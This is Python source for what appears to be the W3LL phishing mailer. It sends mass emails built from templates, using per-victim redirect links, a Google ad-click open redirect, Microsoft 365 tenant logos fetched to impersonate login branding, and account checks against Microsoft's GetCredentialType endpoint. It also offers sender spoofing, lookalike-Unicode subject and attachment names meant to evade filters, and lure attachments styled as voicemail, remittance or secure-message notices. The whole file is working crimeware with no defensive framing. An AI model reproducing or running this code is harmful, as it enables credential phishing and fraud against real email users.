from __future__ import print_function
from mailers import Message
import base64
import requests
import random
import tldextract
import urllib
import string
import os
import sys
import time
import html
import signal
from requests.structures import CaseInsensitiveDict
import datetime
from colorama import Fore
from faker import Faker
from logo import end


def random_char(y):
    return ''.join(random.choice(string.ascii_letters) for x in range(y))


def num(y):
    return ''.join(random.choice(string.digits) for x in range(y))


def symbls(y):
    return ''.join(random.choice(string.punctuation) for x in range(y))


def encode_html_entities(string):
    return html.unescape(string)


def encode_punnycode(string):
    list_chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '[', ']', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', ':', ',', '.', '#']
    replaces = ['ａ', 'ᖯ', 'ｃ', 'ｄ', 'ｅ', 'ｆ', 'ｇ', 'ｈ', 'ｉ', 'ｊ', 'ｋ', 'ｌ', 'ｍ', 'ｎ', 'ｏ', 'ｐ', 'ｑ', 'ｒ', 'ｓ', 'ｔ', 'ｕ', 'ｖ', 'ｗ', 'ｘ', 'ｙ', 'ｚ', '［', '］', 'Ａ', 'Ｂ', 'Ｃ', 'Ｄ', 'Ｅ', 'Ｆ', 'Ｇ', 'Ｈ', 'Ｉ', 'Ｊ', 'Ｋ', 'Ｌ', 'Ｍ', 'Ｎ', 'Ｏ', 'Ｐ', 'Ｑ', 'Ｒ', 'Ｓ', 'Ｔ', 'Ｕ', 'Ｖ', 'Ｗ', 'Ｘ', 'Ｙ', 'Ｚ', '１', '２', '３', '４', '５', '６', '７', '８', '９', '０', '：', '，', '．', '＃']
    for ele in list_chars:
        count = list_chars.index(ele)
        string = string.replace(ele, replaces[count])
    return string


def Check_token(token):
    try:
        now = datetime.datetime.now()
        stamp = datetime.datetime.timestamp(now)
        timer = str(stamp).split('.')
        headers = CaseInsensitiveDict()
        headers['Content-Type'] = 'application/json'
        params = (('token', token), ('time', timer[0]))
        tokres = requests.get('https://w3ll.store/api/sender-punny', headers=headers, params=params, timeout=60)
        return tokres.json()
    except Exception as err:
        print(str(err))
        print('[' + Fore.YELLOW + '!' + Fore.WHITE + '] Server Is Not Connected!')
        sys.exit()


def replace(config, msg, subject, frommail, fromname, email, email_from, code, randurl, microsoft, image_attachment=0):
    # Set timezone
    os.environ['TZ'] = config.get('timezone')
    time.tzset()
    
    fake = Faker()
    domain = tldextract.extract(randurl)
    host = domain[1]
    
    # Encode email to base64
    message_bytes = email.encode('ascii')
    email64 = base64.b64encode(message_bytes)
    base64_message = email64.decode('utf-8')
    email64_urlencode = urllib.parse.quote(base64_message)
    email_urlencode = urllib.parse.quote(email)
    randurl_urlencode = urllib.parse.quote(randurl)
    
    img_src = ''
    
    # Process user name from email
    users = email.split('@')
    if '.' in users[0]:
        user = users[0].split('.')
        user[0] = user[0].title()
        user[1] = user[1].title()
        users = user[0] + ' ' + user[1]
    else:
        users = users[0].title()
    
    domain = email.split('@')[1]
    domains = domain.split('.')
    domain_1 = domains[0].title()
    secret_email = email.split('@')
    assembly = secret_email[0]
    vowels = 'AEIOUaeiou'
    for ele in vowels:
        assembly = assembly.replace(ele, '*')
    assembly = assembly + '@' + secret_email[1]
    
    # Filter non-digit characters from users
    users = ''.join([i for i in users if not i.isdigit()])
    
    redirect = config.get('redirect')
    
    # Build redirect URL based on redirect type
    if redirect == '1':
        randurls = randurl + '?email=' + email64_urlencode
    elif redirect == '2':
        randurls = randurl + '?a=' + email64_urlencode
    elif redirect == '3':
        randurls = randurl + '?email=' + email_urlencode
    elif redirect == '4':
        randurls = randurl + '?' + random_char(8) + '' + num(4) + '#' + email64_urlencode
    elif redirect == '5':
        randurls = randurl + '#' + email64_urlencode
    elif redirect == '6':
        randurls = randurl + '' + email64_urlencode
    elif redirect == '7':
        randurls = randurl + '#' + email_urlencode
    elif redirect == '8':
        randurls = 'https://googleads.g.doubleclick.net/pcs/click?xai=AKAOjssIdZGtK2LGw4coQMwtQcONuf8cVZUVHUrlFgT33_wiLCuxpoweUvHdBH9neY4iW-CZh2SzgITptx6j64F0B2pEU0uoeRfmKTeyn7LSG5Irubqjv6IFl9MeqTp84ZT99WRJlZDMgrwUaUI7QjgNwL22AVveJm980wuVNryiILT2WhxCPmcY8M7PVIOygAXT_382p7PUn7bIByn2OjlTfCiaqta3tAhZWCuROeXZPznm5cGhgUYspVywPb8Y8GbuT5pyEUyF89icmqe5zg&sig=Cg0ArKJSzFtr0kI2Y6Ll&adurl=' + randurl_urlencode + '#' + email64_urlencode + '&nx=CLICK_X&ny=CLICK_Y'
    elif redirect == '9':
        randurls = randurl + '' + code + '/' + email64_urlencode
    
    values = 0
    
    # Microsoft logo extraction
    if microsoft == 1:
        try:
            url = 'https://login.microsoftonline.com/common/GetCredentialType'
            headers = CaseInsensitiveDict()
            headers['Content-Type'] = 'application/json'
            data = '{"username":"' + email + '"}'
            resp = requests.post(url, headers=headers, data=data)
            response = resp.json()
            if 'UserTenantBranding' in response['EstsProperties']:
                if response['EstsProperties']['UserTenantBranding'] is not None:
                    if 'BannerLogo' in response['EstsProperties']['UserTenantBranding'][0]:
                        logo = response['EstsProperties']['UserTenantBranding'][0]['BannerLogo']
                        image_encoded = base64.b64encode(requests.get(logo).content).decode('utf-8')
                        img_src = 'data:image/jpeg;base64,' + image_encoded
                        values = 1
                    else:
                        with open('image/microsoft_PNG10.jpg', 'rb') as image:
                            encoded_string = base64.b64encode(image.read())
                            image_encoded = encoded_string.decode('utf-8')
                        img_src = 'data:image/jpeg;base64,' + str(image_encoded)
                else:
                    with open('image/microsoft_PNG10.jpg', 'rb') as image:
                        encoded_string = base64.b64encode(image.read())
                        image_encoded = encoded_string.decode('utf-8')
                    img_src = 'data:image/jpeg;base64,' + str(image_encoded)
            else:
                with open('image/microsoft_PNG10.jpg', 'rb') as image:
                    encoded_string = base64.b64encode(image.read())
                    image_encoded = encoded_string.decode('utf-8')
                img_src = 'data:image/jpeg;base64,' + str(image_encoded)
        except Exception as err:
            print(str(type(err)))
    
    # Custom image handling
    if config.get('custom_image') == '1':
        with open(config.get_settings('default_logo'), 'rb') as image:
            encoded_string = base64.b64encode(image.read())
            image_encoded = encoded_string.decode('utf-8')
        img_src = 'data:image/jpeg;base64,' + str(image_encoded)
    
    # Logo handling
    if image_attachment == 0:
        if config.get('custom_image') == '0':
            if config.get('logo') == 'cid':
                if values == 0:
                    img_src = 'cid:image1'
            else:
                img_src = 'cid:image1'
        else:
            if config.get('logo') == 'cid':
                img_src = 'cid:image1'
    
    # Generate random IP
    ip = '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))
    
    # Operating systems list
    OSystems = ['Windows 10', 'Windows 8.1', 'Windows 8', 'Windows 7', 'Mac OS X', 'Mac OS 9', 'Linux', 'Ubuntu', 'iPhone', 'iPod', 'iPad', 'Android', 'Windows 10 Home Edition']
    
    # Countries list
    countries = [('US', 'United States'), ('AF', 'Afghanistan'), ('AL', 'Albania'), ...]  # Truncated for brevity
    
    ListBrowser = ['Internet Explorer', 'Firefox', 'Safari', 'Chrome', 'Edge', 'Opera']
    random_country = random.choice(countries)
    number = fake.phone_number()
    original_number = number.replace('x', num(1))
    microtime = int(round(time.time() * 1000))
    
    # Process phone number with random masking
    for i in number:
        if i.isnumeric():
            true = random.choice([True, False])
            if true:
                number = number.replace('x', num(1))
                number = number[:number.index(i)] + '*' + number[number.index(i) + 1:]
    
    # Replacement mappings for template variables
    mapping = [
        ('++w3ll_logo++', str(img_src)),
        ('++w3ll_host++', host),
        ('++w3ll_email++', email),
        ('++w3ll_email64++', base64_message),
        ('++w3ll_email64_urlencode++', email64_urlencode),
        ('++w3ll_short++', randurls),
        ('++w3ll_smtp++', email_from),
        ('++w3ll_subject++', subject),
        ('++w3ll_randomip++', ip),
        ('++w3ll_frommail++', frommail),
        ('++w3ll_fromname++', fromname),
        ('++w3ll_randstring++', random_char(10)),
        ('++w3ll_number1++', num(1)),
        ('++w3ll_number2++', num(2)),
        ('++w3ll_number3++', num(3)),
        ('++w3ll_number4++', num(4)),
        ('++w3ll_number5++', num(5)),
        ('++w3ll_number6++', num(6)),
        ('++w3ll_number7++', num(7)),
        ('++w3ll_number8++', num(8)),
        ('++w3ll_number9++', num(9)),
        ('++w3ll_number10++', num(10)),
        ('++w3ll_symbls1++', symbls(1)),
        ('++w3ll_symbls2++', symbls(2)),
        ('++w3ll_symbls3++', symbls(3)),
        ('++w3ll_symbls4++', symbls(4)),
        ('++w3ll_symbls5++', symbls(5)),
        ('++w3ll_symbls6++', symbls(6)),
        ('++w3ll_symbls7++', symbls(7)),
        ('++w3ll_symbls8++', symbls(8)),
        ('++w3ll_symbls9++', symbls(9)),
        ('++w3ll_symbls10++', symbls(10)),
        ('++w3ll_year++', time.strftime('%Y')),
        ('++w3ll_date++', time.strftime('%Y-%m-%d')),
        ('++w3ll_time++', time.strftime('%H:%M:%S')),
        ('++w3ll_microtime++', str(microtime)),
        ('++w3ll_country++', random_country[1]),
        ('++w3ll_country_code++', random_country[0]),
        ('++w3ll_random_os++', random.choice(OSystems)),
        ('++w3ll_user++', users),
        ('++w3ll_domain++', domain),
        ('++w3ll_domain1++', domain_1),
        ('++w3ll_secret_email++', assembly),
        ('++w3ll_smtp_user++', frommail),
        ('++w3ll_domain2++', domains[0]),
        ('++w3ll_data_name++', fake.name()),
        ('++w3ll_data_address++', fake.address()),
        ('++w3ll_data_licenseplate++', fake.license_plate()),
        ('++w3ll_data_color++', fake.color()),
        ('++w3ll_data_company++', fake.company()),
        ('++w3ll_data_credit_card_expire++', fake.credit_card_expire()),
        ('++w3ll_data_credit_card_number++', fake.credit_card_number()),
        ('++w3ll_data_credit_card_provider++', fake.credit_card_provider()),
        ('++w3ll_data_credit_card_security_code++', fake.credit_card_security_code()),
        ('++w3ll_data_file_name++', fake.file_name()),
        ('++w3ll_data_timezone++', fake.timezone()),
        ('++w3ll_data_pricetag++', fake.pricetag()),
        ('++w3ll_data_ascii_company_email++', fake.ascii_company_email()),
        ('++w3ll_data_ascii_free_email++', fake.ascii_free_email()),
        ('++w3ll_data_company_email++', fake.company_email()),
        ('++w3ll_data_domain_name++', fake.domain_name()),
        ('++w3ll_data_image_url++', fake.image_url()),
        ('++w3ll_data_ipv4++', fake.ipv4()),
        ('++w3ll_data_mac_address++', fake.mac_address()),
        ('++w3ll_data_job++', fake.job()),
        ('++w3ll_data_phone_number++', original_number),
        ('++w3ll_data_secret_phone_number++', number),
        ('++w3ll_data_ssn++', fake.ssn()),
        ('++w3ll_data_chrome++', fake.chrome()),
        ('++w3ll_data_firefox++', fake.firefox()),
        ('++w3ll_data_ios_platform_token++', fake.ios_platform_token()),
        ('++w3ll_data_safari++', fake.safari()),
        ('++w3ll_data_year++', fake.year()),
        ('++w3ll_data_month++', fake.month()),
        ('++w3ll_data_day++', fake.day_of_month()),
        ('++w3ll_data_md5++', fake.md5()),
        ('++w3ll_data_sha1++', fake.sha1()),
        ('++w3ll_data_sha256++', fake.sha256()),
        ('++w3ll_data_uuid++', fake.uuid4()),
    ]
    
    # Apply all replacements
    for k, v in mapping:
        msg = msg.replace(k, v)
    
    return msg


def get_logo(config, email, microsoft):
    if config.get('custom_image') == '0':
        if microsoft == 1:
            url = 'https://login.microsoftonline.com/common/GetCredentialType'
            headers = CaseInsensitiveDict()
            headers['Content-Type'] = 'application/json'
            data = '{"username":"' + email + '"}'
            resp = requests.post(url, headers=headers, data=data)
            response = resp.json()
            if 'UserTenantBranding' in response['EstsProperties']:
                if response['EstsProperties']['UserTenantBranding'] is not None:
                    if 'BannerLogo' in response['EstsProperties']['UserTenantBranding'][0]:
                        logo = response['EstsProperties']['UserTenantBranding'][0]['BannerLogo']
                        img_data = requests.get(logo).content
                        image_name = 'image/' + random_char(10) + '.jpg'
                        with open(image_name, 'wb') as handler:
                            handler.write(img_data)
                    else:
                        image_name = config.get_settings('default_logo')
                else:
                    image_name = config.get_settings('default_logo')
            else:
                image_name = config.get_settings('default_logo')
        else:
            image_name = config.get_settings('default_logo')
    else:
        image_name = config.get_settings('default_logo')
    
    return image_name


def send(mails, smtp_count, code, lines, total_lines, config, host, email, password, port, email_to, fromname, frommail, header, subjects, randurl, letter, smtpcut, emailcut, subjectscut, fromnamecut, gets, file_object_name, file_object, attach, message, i, head, headtit, logos, valid, url, headers, resp, response, data, o365, msg, errmsg, save, a_file, liness, oltra, new_file, line, f):
    header = []
    
    subjects = config.get_subject()
    subjects = random.choice(subjects)
    
    randurl = config.get_url()
    randurl = random.choice(randurl)
    
    randurl = replace(config, randurl, subjects, frommail, fromname, email_to, email, code, randurl, 0)
    subjects = replace(config, subjects, subjects, frommail, fromname, email_to, email, code, randurl, 0)
    letter = replace(config, config.get_letter(), subjects, frommail, fromname, email_to, email, code, randurl, 1)
    fromname = replace(config, fromname, subjects, frommail, fromname, email_to, email, code, randurl, 0)
    frommail = replace(config, frommail, subjects, frommail, fromname, email_to, email, code, randurl, 0)
    
    smtpcut = frommail[:7] + '...' if len(frommail) >= 7 else frommail
    emailcut = email_to[:7] + '...' if len(email_to) >= 7 else email_to
    subjectscut = subjects[:7] + '...' if len(subjects) >= 7 else subjects
    fromnamecut = fromname[:7] + '...' if len(fromname) >= 7 else fromname
    
    if config.get('fromname_encrypt') == '1':
        if config.get('fromname_encode_type') == 'punnycode':
            fromname = encode_punnycode(fromname)
        else:
            fromname = encode_html_entities(fromname)
    
    if config.get('subject_encrypt') == '1':
        if config.get('subject_encode_type') == 'punnycode':
            subjects = encode_punnycode(subjects)
        else:
            subjects = encode_html_entities(subjects)
    
    if '.pdf' in config.config['settings']['attachment']:
        if config.get('filesend') == '1':
            filesend_type = config.get('filesend_type')
            
            if filesend_type == 'voicemail':
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/📞_𝙼𝚎𝚜𝚜𝚊𝚐𝚎－{num(7)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(config.get_attachment())
            
            elif filesend_type == 'remittance':
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/𝚁𝚎𝚖𝚒𝚝𝚊𝚗𝚌𝚎－{num(9)}-{num(9)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(config.get_attachment())
            
            elif filesend_type == 'keep password':
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/𝙿𝙰𝚂𝚂＿𝙸𝙳－{num(9)}-{num(9)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(config.get_attachment())
            
            elif filesend_type == 'message fail':
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/𝙼𝚎𝚜𝚜𝚊𝚐𝚎＿𝙵𝚊𝚒𝙸＿𝚍𝚎𝙸𝚒𝚟𝚎𝚛𝚎𝚍－{num(9)}-{num(9)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(config.get_attachment())
            
            elif filesend_type == 'fax':
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/𝙵‍a𝚡‍＿𝙸𝙳－{num(9)}-{num(9)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(config.get_attachment())
            
            elif filesend_type == 'secure':
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/𝚂‍e𝚌‍𝚞‍𝚛‍e𝙼‍e𝚜‍𝚜‍a𝚐‍e－{num(9)}-{num(9)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(config.get_attachment())
            
            elif filesend_type == 'email':
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/{email_to}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(config.get_attachment())
            
            elif filesend_type == 'date':
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/{datetime.datetime.now().strftime("%Y-%m-%d")}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(config.get_attachment())
            
            elif filesend_type == 'randnum':
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/{num(5)}-{num(5)}-{num(5)}-{num(7)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(config.get_attachment())
            
            else:
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(config.get_attachment())
        
        elif config.get('filesend') == '1':
            # Second block for filesend_type with replace
            filesend_type = config.get('filesend_type')
            
            if filesend_type == 'voicemail':
                attach = replace(config, config.get_attachment(), subjects, frommail, fromname, email_to, email, code, randurl, 1, 1)
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/📞_𝙼𝚎𝚜𝚜𝚊𝚐𝚎－{num(7)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(config.get_attachment())
            
            elif filesend_type == 'remittance':
                attach = replace(config, config.get_attachment(), subjects, frommail, fromname, email_to, email, code, randurl, 1, 1)
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/𝚁𝚎𝚖𝚒𝚝𝚊𝚗𝚌𝚎－{num(9)}-{num(9)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(attach)
            
            elif filesend_type == 'keep password':
                attach = replace(config, config.get_attachment(), subjects, frommail, fromname, email_to, email, code, randurl, 1, 1)
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/𝙿𝙰𝚂𝚂＿𝙸𝙳－{num(9)}-{num(9)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(attach)
            
            elif filesend_type == 'message fail':
                attach = replace(config, config.get_attachment(), subjects, frommail, fromname, email_to, email, code, randurl, 1, 1)
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/𝙼𝚎𝚜𝚜𝚊𝚐𝚎＿𝙵𝚊𝚒𝙸＿𝚍𝚎𝙸𝚒𝚟𝚎𝚛𝚎𝚍－{num(9)}-{num(9)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(attach)
            
            elif filesend_type == 'fax':
                attach = replace(config, config.get_attachment(), subjects, frommail, fromname, email_to, email, code, randurl, 1, 1)
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/𝙵‍a𝚡‍＿𝙸𝙳－{num(9)}-{num(9)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(attach)
            
            elif filesend_type == 'secure':
                attach = replace(config, config.get_attachment(), subjects, frommail, fromname, email_to, email, code, randurl, 1, 1)
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/𝚂‍e𝚌‍𝚞‍𝚛‍e𝙼‍e𝚜‍𝚜‍a𝚐‍e－{num(9)}-{num(9)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(attach)
            
            elif filesend_type == 'email':
                attach = replace(config, config.get_attachment(), subjects, frommail, fromname, email_to, email, code, randurl, 1, 1)
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/{email_to}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(attach)
            
            elif filesend_type == 'date':
                attach = replace(config, config.get_attachment(), subjects, frommail, fromname, email_to, email, code, randurl, 1, 1)
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/{datetime.datetime.now().strftime("%Y-%m-%d")}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(attach)
            
            elif filesend_type == 'randnum':
                attach = replace(config, config.get_attachment(), subjects, frommail, fromname, email_to, email, code, randurl, 1, 1)
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/{num(5)}-{num(5)}-{num(5)}-{num(7)}-{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(attach)
            
            else:
                attach = replace(config, config.get_attachment(), subjects, frommail, fromname, email_to, email, code, randurl, 1, 1)
                gets = config.config['settings']['attachment'].split('/')
                file_object_name = f'files/attachment/{gets[2]}'
                with open(file_object_name, 'a') as file_object:
                    file_object.write(attach)
    
    message = Message()
    message.config = config
    
    if config.get('spoofself') == '0':
        message.From = f'"{fromname}" <{frommail}>'
    else:
        message.From = f'"{email_to}" <{email_to}>'
    
    message.charset = config.get('charset')
    message.Subject = subjects
    message.Html = letter
    
    if config.get('reply_to') != '':
        message.RTo = config.get('reply_to')
    
    if config.get('send_type') == 'cc':
        message.To = ''
        message.CC = email_to
    elif config.get('send_type') == 'bcc':
        message.To = ''
        message.BCC = email_to
    else:
        message.To = email_to
    
    message.header('X-Priority', config.get('priority'))
    
    if config.get('custom_header') == '1':
        header = config.get_custom_header()
        i = 0
        while i < len(header):
            head = str(header[i][1])
            headtit = str(header[i][0]).capitalize()
            if 'Message-id' in headtit:
                headtit = 'Message-ID'
            head = replace(config, header[i][1], subjects, frommail, fromname, email_to, email, code, randurl, 0)
            message.header(headtit, head)
            i += 1
    
    if config.get('logo') == 'cid':
        logos = get_logo(config, email_to)
        message.attach(logos, 'image1')
    
    if config.get('filesend') in ('1', '2', '3'):
        if '.htm' in file_object_name or '.doc' in file_object_name or '.pdf' in file_object_name:
            if '.htm' in file_object_name:
                message.attach(file_object_name, charset=config.get('charset'))
            else:
                message.attach(file_object_name)
    
    valid = True
    if config.get('email_validation') == '1':
        url = f'https://verify.gmass.co/verify?key=52d5d6dd-cd2b-4e5a-a76a-1667aea3a6fc&email={email_to}'
        headers = CaseInsensitiveDict()
        headers['Content-Type'] = 'application/json'
        resp = requests.get(url, headers=headers, timeout=15)
        response = resp.json()
        if response['Valid'] is False:
            valid = False
        else:
            headers = CaseInsensitiveDict({
                'Connection': 'keep-alive',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55',
                'Content-type': 'application/json; charset=UTF-8'
            })
            data = f'{{"username":"{email_to}"}}'
            o365 = requests.post('https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US', headers=headers, data=data)
            if 'IfExistsResult":0' in o365.text and 'IsSignupDisallowed":true' in o365.text:
                valid = True
            else:
                valid = False
    
    if valid is True:
        if mails[smtp_count].is_connected():
            msg = mails[smtp_count].send_test(message, debug=config.get('debug_smtp'))
            
            if any(err in str(msg) for err in ['quota', 'Quota', 'QUOTA', 'limit', 'LIMIT', 'Sending rate exceeded', 'Too many messages from sender']):
                errmsg = 'LMIT'
                print(f'│  {datetime.datetime.now().strftime("%H:%M:%S")}  │ {Fore.RED}{smtpcut}{Fore.WHITE} │ {Fore.RED}{emailcut}{Fore.WHITE} │ {Fore.RED}{subjectscut}{Fore.WHITE} │ {Fore.RED}{fromnamecut}{Fore.WHITE} │    {Fore.RED}{errmsg}{Fore.WHITE}     │ ')
            elif any(err in str(msg) for err in ['Temporary', 'temporary', 'TEMPORARY']):
                errmsg = 'TEMP'
                print(f'│  {datetime.datetime.now().strftime("%H:%M:%S")}  │ {Fore.RED}{smtpcut}{Fore.WHITE} │ {Fore.RED}{emailcut}{Fore.WHITE} │ {Fore.RED}{subjectscut}{Fore.WHITE} │ {Fore.RED}{fromnamecut}{Fore.WHITE} │    {Fore.RED}{errmsg}{Fore.WHITE}     │ ')
            elif any(err in str(msg) for err in ['SPAM', 'Spam', 'spam']):
                errmsg = 'SPAM'
                print(f'│  {datetime.datetime.now().strftime("%H:%M:%S")}  │ {Fore.RED}{smtpcut}{Fore.WHITE} │ {Fore.RED}{emailcut}{Fore.WHITE} │ {Fore.RED}{subjectscut}{Fore.WHITE} │ {Fore.RED}{fromnamecut}{Fore.WHITE} │    {Fore.RED}{errmsg}{Fore.WHITE}     │ ')
            elif 'Sending paused' in str(msg):
                errmsg = 'PUSD'
                print(f'│  {datetime.datetime.now().strftime("%H:%M:%S")}  │ {Fore.RED}{smtpcut}{Fore.WHITE} │ {Fore.RED}{emailcut}{Fore.WHITE} │ {Fore.RED}{subjectscut}{Fore.WHITE} │ {Fore.RED}{fromnamecut}{Fore.WHITE} │    {Fore.RED}{errmsg}{Fore.WHITE}     │ ')
            elif 'Email address is not verified' in str(msg):
                errmsg = 'EVER'
                print(f'│  {datetime.datetime.now().strftime("%H:%M:%S")}  │ {Fore.RED}{smtpcut}{Fore.WHITE} │ {Fore.RED}{emailcut}{Fore.WHITE} │ {Fore.RED}{subjectscut}{Fore.WHITE} │ {Fore.RED}{fromnamecut}{Fore.WHITE} │    {Fore.RED}{errmsg}{Fore.WHITE}     │ ')
            else:
                mails[smtp_count].connect(debug=config.get('debug_smtp'))
                if mails[smtp_count].is_connected():
                    msg = mails[smtp_count].send_test(message, debug=config.get('debug_smtp'))
                else:
                    errmsg = 'RECN'
                    msg = 'Reconnect'
        else:
            mails[smtp_count].connect(debug=config.get('debug_smtp'))
            if mails[smtp_count].is_connected():
                msg = mails[smtp_count].send_test(message, debug=config.get('debug_smtp'))
            else:
                errmsg = 'RECN'
                msg = 'Reconnect'
        
        if 'SMTPAuthenticationError' in msg or 'SMTPNotSupportedError' in msg:
            errmsg = 'AUTH'
        elif 'SMTPRecipientsRefused' in msg:
            errmsg = 'RREF'
        elif 'SMTPSenderRefused' in msg:
            errmsg = 'SREF'
        elif 'SMTPDataError' in msg:
            errmsg = 'LMIT'
        elif any(err in msg for err in ['SMTPServerDisconnected', 'SMTPConnectError', 'socket.gaierror', 'ConnectionRefusedError', 'OSError']):
            errmsg = 'DISC'
        elif 'socket.timeout' in msg:
            errmsg = 'TIMO'
        elif 'Reconnect' in msg:
            errmsg = 'RECN'
        else:
            errmsg = 'INVD'
    else:
        msg = 'INVALID'
        errmsg = 'EIVD'
    
    print(f'│  {datetime.datetime.now().strftime("%H:%M:%S")}  │ {smtpcut} │ {emailcut} │ {subjectscut} │ {fromnamecut} │  {Fore.YELLOW}sending..  {Fore.WHITE}│ ', end='\r')
    sys.stdout.flush()
    time.sleep(1.5)
    
    if msg == 'OK':
        if config.get('email_destination') != email_to:
            print(f'│  {datetime.datetime.now().strftime("%H:%M:%S")}  │ {Fore.GREEN}{smtpcut}{Fore.WHITE} │ {Fore.GREEN}{emailcut}{Fore.WHITE} │ {Fore.GREEN}{subjectscut}{Fore.WHITE} │ {Fore.GREEN}{fromnamecut}{Fore.WHITE} │    {Fore.GREEN}SENT{Fore.WHITE}     │ ')
            sys.stdout.flush()
            with open('SPAMMED.txt', 'a+') as save:
                save.write(email_to + '\n')
        else:
            print(f'│  {datetime.datetime.now().strftime("%H:%M:%S")}  │ {Fore.YELLOW}{smtpcut}{Fore.WHITE} │ {Fore.YELLOW}TEST MAIL!{Fore.WHITE} │ {Fore.YELLOW}{subjectscut}{Fore.WHITE} │ {Fore.YELLOW}{fromnamecut}{Fore.WHITE} │    {Fore.YELLOW}SENT{Fore.WHITE}     │ ')
    else:
        print(f'│  {datetime.datetime.now().strftime("%H:%M:%S")}  │ {Fore.RED}{smtpcut}{Fore.WHITE} │ {Fore.RED}{emailcut}{Fore.WHITE} │ {Fore.RED}{subjectscut}{Fore.WHITE} │ {Fore.RED}{fromnamecut}{Fore.WHITE} │    {Fore.RED}{errmsg}{Fore.WHITE}     │ ')
        sys.stdout.flush()
        with open('UNSPAMMED.txt', 'a+') as save:
            save.write(email_to + '\n')
    
    if config.get('remove_email') == '1':
        with open(config.config['settings']['maillist'], 'r') as a_file:
            liness = a_file.readlines()
        del liness[0]
        with open(config.config['settings']['maillist'], 'w+') as new_file:
            for line in liness:
                new_file.write(line)
    
    if config.get('filesend') != '0':
        os.remove(file_object_name)
    
    config.config.set('session', 'email', str(lines))
    with open('config.ini', 'w') as f:
        config.config.write(f)
    
    if lines == total_lines:
        time.sleep(5)
        end()
        config.config.set('session', 'email', '0')
        with open('config.ini', 'w') as f:
            config.config.write(f)

def error_code(string):
    if 'SMTPAuthenticationError' in string or 'SMTPNotSupportedError' in string:
        errmsg = 'AUTH'
    elif 'SMTPRecipientsRefused' in string:
        errmsg = 'RREF'
    elif 'SMTPSenderRefused' in string:
        errmsg = 'SREF'
    elif 'SMTPDataError' in string:
        errmsg = 'LMIT'
    elif 'SMTPServerDisconnected' in string or 'SMTPConnectError' in string or 'socket.gaierror' in string or 'ConnectionRefusedError' in string or 'OSError' in string:
        errmsg = 'DISC'
    elif 'socket.timeout' in string:
        errmsg = 'TIMO'
    else:
        errmsg = 'INVD'
    return errmsg


def notice(string):
    print(Fore.YELLOW + string + '.' + '\r', end='')
    sys.stdout.flush()
    time.sleep(0.5)
    print(string + '..' + '\r', end='')
    sys.stdout.flush()
    time.sleep(0.5)
    print(string + '...' + Fore.WHITE)
    sys.stdout.flush()
    time.sleep(3)


def init_worker():
    signal.signal(signal.SIGINT, signal.SIG_IGN)